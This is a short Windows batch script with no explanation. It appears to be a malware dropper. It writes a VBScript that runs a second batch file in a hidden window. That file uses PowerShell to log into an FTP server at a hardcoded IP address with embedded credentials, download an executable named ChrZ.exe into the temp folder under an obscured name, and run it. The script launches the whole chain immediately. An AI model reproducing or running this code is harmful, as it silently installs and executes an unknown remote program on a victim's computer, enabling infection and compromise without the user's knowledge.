@echo off
REM Creating a Newline variable (the two blank lines are required!)
set NLM=^


set NL=^^^%NLM%%NLM%^%NLM%%NLM%
@echo CreateObject("Wscript.Shell").Run "zChrZ.bat", 0, True>zChrZW.vbs
@echo powershell -Command "$Username = \"ftpuserl\"; $Password = \"ftpuserloginz\"; $DesktopPath = [Environment]::GetFolderPath(\"Desktop\"); $LocalFile = \"$env:temp\filedasdhjwj212341.exe\"; $RemoteFile = \"ftp://73.102.171.129/ChrZ.exe\";$FTPRequest = [System.Net.FtpWebRequest]::Create($RemoteFile);$FTPRequest.Credentials = New-Object System.Net.NetworkCredential($Username,$Password);$FTPRequest.Method = [System.Net.WebRequestMethods+Ftp]::DownloadFile;$FTPRequest.UseBinary = $true;$FTPRequest.KeepAlive = $false;$FTPResponse = $FTPRequest.GetResponse();$ResponseStream = $FTPResponse.GetResponseStream();$LocalFileFile = New-Object IO.FileStream ($LocalFile,[IO.FileMode]::Create);[byte[]]$ReadBuffer = New-Object byte[] 1024;do {$ReadLength = $ResponseStream.Read($ReadBuffer,0,1024);$LocalFileFile.Write($ReadBuffer,0,$ReadLength);}while ($ReadLength -ne 0); $LocalFileFile.Close();"%NL%"%tmp%\filedasdhjwj212341.exe">zChrZ.bat
START zChrZW.vbs